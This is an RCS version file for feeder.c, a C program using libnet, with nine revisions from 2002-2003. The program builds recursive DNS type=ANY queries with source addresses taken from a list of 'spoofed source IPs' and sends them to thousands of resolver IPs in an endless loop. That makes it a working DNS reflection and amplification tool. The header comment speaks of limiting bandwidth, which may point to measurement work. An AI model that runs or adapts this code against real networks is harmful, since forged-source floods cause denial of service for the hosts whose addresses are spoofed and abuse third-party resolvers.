head	1.9;
access;
symbols;
locks
	yudong:1.9; strict;
comment	@ * @;


1.9
date	2003.05.11.00.28.11;	author yudong;	state Exp;
branches;
next	1.8;

1.8
date	2003.04.28.02.17.41;	author yudong;	state Exp;
branches;
next	1.7;

1.7
date	2002.11.10.23.09.29;	author yudong;	state Exp;
branches;
next	1.6;

1.6
date	2002.11.04.01.55.05;	author yudong;	state Exp;
branches;
next	1.5;

1.5
date	2002.11.03.05.24.09;	author yudong;	state Exp;
branches;
next	1.4;

1.4
date	2002.11.03.04.13.37;	author yudong;	state Exp;
branches;
next	1.3;

1.3
date	2002.11.03.02.24.20;	author yudong;	state Exp;
branches;
next	1.2;

1.2
date	2002.11.02.03.51.34;	author yudong;	state Exp;
branches;
next	1.1;

1.1
date	2002.11.01.22.43.57;	author yudong;	state Exp;
branches;
next	;


desc
@not finished yet.
@


1.9
log
@Moved usleep delay out of two for loops for faster sending.
@
text
@/*
 *  $Id: feeder.c,v 1.8 2003/04/28 02:17:41 yudong Exp yudong $
 *
 *  Build a DNS type=any query packet
 *  with delay specified so for 3000 resolver IPs, the bandwidth
 *  is used for less than 30kbps.
 *
 */

#include <libnet.h>
#define MAXLINES 10000

int main(int argc, char *argv[])
{
    int c, i; 
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t ip;
    libnet_ptag_t udp;
    libnet_ptag_t dns;
    struct libnet_stats ls;
    u_long nround; 
    u_long src_ip, dst_ip;
    u_short src_prt, dst_prt;
    u_char opt[20];
    char errbuf[LIBNET_ERRBUF_SIZE];
    FILE *dmf, *nsf, *srcf;
    char *dms[MAXLINES], *nss[MAXLINES], *srcs[MAXLINES];
    int pay_s[MAXLINES];
    char *dmfn = "dm.txt";
    char *nsfn = "ns.txt";
    char *srcfn = "src.txt";
    char *paybuf, *pp;
    int jd = 0;
    int jn = 0;
    int js = 0;
    int kd, kn;
    u_long delay = 20; /* microsec */
    u_char bt;
    char lb[80];
    char linebuf[80];
    char payld[100], tpayld[100];

/* get the specified delay */
   if ( getopt(argc, argv, "d:") == 'd')
     delay = atoi(optarg);   
       
/* Read the domains and DNS IPs, and construct DNS palyload */ 

    if( (dmf = fopen(dmfn, "r")) == NULL) {
      fprintf(stderr, "Error opening file %s \n", dmfn); 
      exit(1);
    } /* end if */ 
 
    if( (nsf = fopen(nsfn, "r")) == NULL) {
      fprintf(stderr, "Error opening file %s \n", nsfn); 
      exit(1);
    } /* end if */ 
 
    if( (srcf = fopen(srcfn, "r")) == NULL) {
      fprintf(stderr, "Error opening file %s \n", srcfn); 
      exit(1);
    } /* end if */ 
 
    printf("Reading domain names ...\n");
    while ((jd < MAXLINES) && (fgets(lb, 80, dmf)!=0) )  {
       kd = 0; 
       kn = 0;
       while (lb[kd] != '\0') {        /* get rid of space and CR */
        if ((lb[kd] != ' ') && (lb[kd] != '\n')) {
           linebuf[kn] = lb[kd];
           kn++;
        }  /* end if */
        kd++; 
       } /* end while */
       linebuf[kn] = '\0'; 
       paybuf = linebuf;
       if (kn != 0) { /* not empty line */ 
         /* convert domain name into DNS query message payload */
         *payld = '\0'; 
         while ( (pp = strchr(paybuf, '.') )!=NULL ) { 
            *pp++ = '\0';
            sprintf(tpayld, "%c%s", strlen(paybuf), paybuf); 
            strcat(payld, tpayld); 
            paybuf = pp; 
         }  /* end while */ 
            sprintf(tpayld, "%c%s", strlen(paybuf), paybuf); 
            strcat(payld, tpayld); 
          
         dms[jd] = (char *)malloc(strlen(payld)+10);  /* alloc mem */
         strcpy(dms[jd], payld); 
         pay_s[jd] = strlen(dms[jd]) + 1; 
         *(dms[jd] + pay_s[jd]) = '\x00'; 
         *(dms[jd] + pay_s[jd]+1) = '\xff';  /* query type=any */
         *(dms[jd] + pay_s[jd]+2) = '\x00'; 
         *(dms[jd] + pay_s[jd]+3) = '\x01'; 
         *(dms[jd] + pay_s[jd]+4) = '\x00'; 
         pay_s[jd] += 4; 
         /* ===== for message body debugging 
         for (kn=0; kn < pay_s[jd]; kn++) { 
            bt = *(dms[jd] + kn); 
            printf(" %02X", bt); 
         }  
         printf("\n");
         === */
     
         jd++;
       } /* end if  */
    } /* end while  */
 
    printf("Total domains: %d\n", jd); 
    fclose(dmf);
   
    js=0; 
    printf("Reading spoofed source IPs ... \n");
    while ((js < MAXLINES) && (fgets(lb, 80, srcf)!=0) )  {
       kd = 0; 
       kn = 0;
       while (lb[kd] != '\0') {        /* get rid of space and CR */
        if ((lb[kd] != ' ') && (lb[kd] != '\n')) {
           linebuf[kn] = lb[kd];
           kn++;
        }  /* end if */
        kd++; 
       } /* end while */
       linebuf[kn] = '\0'; 
       if (kn != 0) { /* not empty line */ 
         srcs[js] = (char *)malloc(strlen(linebuf)+1); 
         strcpy(srcs[js++], linebuf); 
         /* printf("%s\n", srcs[js-1]); */
       } /* end if */   
    } /* end while  */
   
    printf("Total source IPs: %d\n", js); 
    fclose(srcf);
    
    jn = 0; 
    printf("Reading resolver IPs ... \n");
    while ((jn < MAXLINES) && (fgets(lb, 80, nsf)!=0) )  {
       kd = 0;
       kn = 0;
       while (lb[kd] != '\0') {        /* get rid of space and CR */
        if ((lb[kd] != ' ') && (lb[kd] != '\n')) {
           linebuf[kn] = lb[kd];
           kn++;
        }  /* end if */
        kd++;
       } /* end while */
       linebuf[kn] = '\0';
       if (kn != 0) { /* not empty line */
         nss[jn] = (char *)malloc(strlen(linebuf)+1);
         strcpy(nss[jn++], linebuf);
         /*  printf("%s\n", nss[jn-1]); */
       } /* end if */  
    } /* end while  */
  
    printf("Total DNS IPs: %d\n", jn);
    fclose(nsf);

nround = 0; 
while(1) {   /* non-stop sending ... */
    /* Initialize the library.  Root priviledges are required.  */
    l = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            NULL,                                   /* network interface */
            errbuf);                                /* errbuf */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    libnet_seed_prand(l);
    udp = 0; 
    dns = 0; 
    ip = 0;

 for(kd=0; kd < jd; kd++) {  /* loop over all domains */ 

   for(kn=0; kn < jn; kn++) {  /* loop over all DNS IPs */ 

   if ((dst_ip = inet_addr(nss[kn])) == -1) {
        fprintf(stderr, "Bad DNS IP address: %s\n", nss[kn]);
        exit(EXIT_FAILURE);
   }  /* end if */

    /* printf("feeding %s for domain %s ...\n", nss[kn], dms[kd]);  */
    i = (int)(libnet_get_prand(LIBNET_PRu16)/65535.0*(js-1));  /* Randsrc ip */
    src_ip = inet_addr(srcs[i]); /* real ip */ 
    /* printf("using source IP %s ...\n", srcs[i]);   */
    src_prt = libnet_get_prand(LIBNET_PRu16);    /* Random source port */
    dst_prt = 53;			         /* DNS */		 

/* Building DNS query */
  dns = libnet_build_dnsv4(
    libnet_get_prand(LIBNET_PRu16),         /* ID */
    0x0100,            /* flags: recursive query */
    0x0001,            /* number of questions */
    0x0000,            /* number of answer resource records */
    0x0000,            /* number of authority resource records */
    0x0000,            /* number of additional resource records */
    dms[kd],           /* pointer to packet data (or NULL) */
    pay_s[kd],             /* payload length */
    l,         /* libnet context pointer */
    dns       /* packet id */
    );

        if (dns == -1) {
            fprintf(stderr, "Can't build DNS header: %s\n", libnet_geterror(l));
            goto bad;
        }

/* Building UDP */
        udp = libnet_build_udp(
            src_prt,                                /* source port */
            dst_prt,                            /* destination port */
            LIBNET_UDP_H + pay_s[kd] + LIBNET_DNSV4_H,   /* packet length */
            0,                                      /* checksum */
            NULL,                                /* payload */
            0,                              /* payload size */
            l,                                      /* libnet handle */
            udp);                                   /* libnet id */

        if (udp == -1) {
            fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
            goto bad;
        }

/* Building IP */
            
            ip = libnet_build_ipv4(
                LIBNET_IPV4_H + pay_s[kd] + LIBNET_UDP_H + LIBNET_DNSV4_H, /* length */
                0x00,                                          /* TOS */
                0,                                            /* IP ID */
                0x0000,                                          /* IP Frag */
                64,                                         /* TTL */
                IPPROTO_UDP,                                /* protocol */
                0,                                          /* checksum */
                src_ip,
                dst_ip,
                NULL,                                       /* payload */
                0,                                          /* payload size */
                l,                                          /* libnet handle */
                ip);                                         /* libnet id */

            if (ip == -1) {
             fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
             goto bad;
            }

/*  Write it to the wire. */
        c = libnet_write(l);
        if (c == -1) { 
            fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
            goto bad;
        } else {
            /* printf("Wrote %d byte UDP packet; check the wire.\n", c); */
        }
 
   /* printf("Delaying %d microsec between each packet ... \n", delay); */
   } /* end for */ 
}  /* end for */

    libnet_stats(l, &ls);
    fprintf(stderr, "Packets sent:  %ld\n"
                    "Packet errors: %ld\n"
                    "Bytes written: %ld\n",
                    ls.packets_sent, ls.packet_errors, ls.bytes_written);
    libnet_destroy(l);

 usleep(delay);  /* slow down to conserve bandwidth */
 nround++;
 printf("====== Round %ld sent ================\n", nround); 
}  /* end of while loop */
    return (EXIT_SUCCESS);
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
}

@


1.8
log
@Changed libnet_resolve to inet_addr for better performance.
@
text
@d2 1
a2 1
 *  $Id: feeder.c,v 1.7 2002/11/10 23:09:29 yudong Exp yudong $
a261 1
   usleep(delay);  /* slow down to conserve bandwidth */
d272 1
@


1.7
log
@Add command line option to change delays (in microsec)
@
text
@d2 1
a2 1
 *  $Id: feeder.c,v 1.6 2002/11/04 01:55:05 yudong Exp yudong $
d183 1
a183 1
   if ((dst_ip = libnet_name2addr4(l, nss[kn], LIBNET_RESOLVE)) == -1) {
d190 1
a190 1
    src_ip = libnet_name2addr4(l, srcs[i], LIBNET_RESOLVE); /* real ip */ 
d261 1
a261 1
   printf("Delaying %d microsec between each packet ... \n", delay); 
@


1.6
log
@Added 20 milsec  delay to control bandwidth usage.
@
text
@d2 1
a2 1
 *  $Id: feeder.c,v 1.5 2002/11/03 05:24:09 yudong Exp yudong $
d38 1
d44 4
d260 3
a262 2

   usleep(20);  /* slow down to conserve bandwidth */
@


1.5
log
@Final version. Non-stop loop added. 2-sec delay for each domain.
@
text
@d2 1
a2 1
 *  $Id: feeder.c,v 1.4 2002/11/03 04:13:37 yudong Exp yudong $
d5 2
d256 1
a257 1
   sleep(2); 
@


1.4
log
@Final vaer
Final version. Needs to figure out icmp "port unreachable " mesg means.
@
text
@d2 1
a2 1
 *  $Id: feeder.c,v 1.3 2002/11/03 02:24:20 yudong Exp yudong $
d20 1
d92 1
d96 1
a96 1
         } 
d98 1
d123 1
a123 1
         printf("%s\n", srcs[js-1]);
d146 1
a146 1
         printf("%s\n", nss[jn-1]);
d153 2
d181 1
a181 1
    printf("feeding %s for domain %s ...\n", nss[kn], dms[kd]);  
d184 1
a184 1
    printf("using source IP %s ...\n", srcs[i]);  
d251 1
a251 1
            printf("Wrote %d byte UDP packet; check the wire.\n", c);
a253 1
   /* sleep(2); */
d255 1
d265 3
@


1.3
log
@*** empty log message ***
@
text
@d2 1
a2 1
 *  $Id: feeder.c,v 1.2 2002/11/02 03:51:34 yudong Exp yudong $
d82 1
a82 1
         dms[jd] = (char *)malloc(strlen(payld)+1);  /* alloc mem */
d90 1
a90 1
         pay_s[jd] += 5; 
d180 1
a180 1
    src_prt = libnet_get_prand(LIBNET_PRu16);	 /* Random source port */
d224 1
a224 1
                0x4000,                                          /* IP Frag */
@


1.2
log
@working.
@
text
@d2 1
a2 1
 *  $Id: feeder.c,v 1.1 2002/11/01 22:43:57 yudong Exp yudong $
d24 2
a25 2
    FILE *dmf, *nsf;
    char *dms[MAXLINES], *nss[MAXLINES];
d29 1
d33 1
d52 5
d89 2
a90 1
         pay_s[jd] += 4; 
d104 3
a106 2
    printf("Reading resolver IPs ... \n");
    while ((jn < MAXLINES) && (fgets(lb, 80, nsf)!=0) )  {
d118 3
a120 3
         nss[jn] = (char *)malloc(strlen(linebuf)+1); 
         strcpy(nss[jn++], linebuf); 
         printf("%s\n", nss[jn-1]);
d124 24
a147 1
    printf("Total DNS IPs: %d\n", jn); 
d149 1
a149 1
    
d167 3
a169 1
 for(kn=0; kn < jn; kn++) {  /* loop over all DNS IPs */ 
a175 2
   for(kd=0; kd < jd; kd++) {  /* loop over all domains */ 

d177 3
a179 1
    src_ip = libnet_get_prand(LIBNET_PRu32);     /* Random src ip */     
d223 2
a224 2
                libnet_get_prand(LIBNET_PRu16),             /* IP ID */
                0,                                          /* IP Frag */
d249 1
a249 1
   sleep(2); 
@


1.1
log
@Initial revision
@
text
@d2 1
a2 1
 *  $Id: mytestudp.c,v 1.2 2002/11/01 04:39:27 yudong Exp yudong $
d13 1
a13 1
    int c, i, build_ip;
a18 2
    char *payload;
    u_short payload_s;
d111 1
a111 1
         printf("%s-\n", nss[jn-1]);
d118 1
a118 9

    for(kn=0; kn < jn; kn++) {  /* loop over all DNS IPs */ 
      for(kd=0; kd < jd; kd++) {  /* loop over all domains */ 

       printf("feeding %s for domain %s ...\n", nss[kn], dms[kd]);  

    /*
     *  Initialize the library.  Root priviledges are required.
     */
d131 10
d142 3
a147 10
    payload = testpayload; 
    /*  payload_s = strlen(payload); */
    payload_s = 20;
    udp = 0;

    if ((dst_ip = libnet_name2addr4(l, destIP, LIBNET_RESOLVE)) == -1)
                {
                    fprintf(stderr, "Bad destination IP address: %s\n", destIP);
                    exit(EXIT_FAILURE);
                }
d157 2
a158 2
    payload,           /* pointer to packet data (or NULL) */
    payload_s,             /* payload length */
d160 1
a160 1
    0       /* packet id */
d163 1
a163 2
        if (dns == -1)
        {
a167 1

d172 1
a172 1
            LIBNET_UDP_H + payload_s + LIBNET_DNSV4_H,   /* packet length */
d178 2
a179 2
        if (udp == -1)
        {
d185 1
a185 1

d187 2
a188 2
                LIBNET_IPV4_H + payload_s + LIBNET_UDP_H + LIBNET_DNSV4_H, /* length */
                0x10,                                          /* TOS:DNS */
d199 3
a201 3
                0);                                         /* libnet id */
            if (ip == -1)
            {
d208 1
a208 1
        if (c == -1) {
d214 4
@
